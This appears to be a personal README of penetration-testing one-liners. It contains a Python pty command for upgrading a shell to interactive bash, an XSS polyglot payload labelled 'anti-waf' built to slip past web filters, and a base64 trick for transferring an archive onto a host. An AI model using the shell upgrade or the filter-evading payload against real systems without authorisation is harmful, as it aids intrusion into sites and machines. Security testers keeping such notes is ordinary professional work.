# oneliners
Collection of handy one line things 

# ye olde pty 
python -c 'import pty; pty.spawn("/bin/bash")'

# pentest 

## anti-waf
javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>


# Upload not one line
cat archive.tar.gz | base64
cat <<EOF | base64 -d > archive.tar.gz
///// paste here the base64 encoded file
EOF
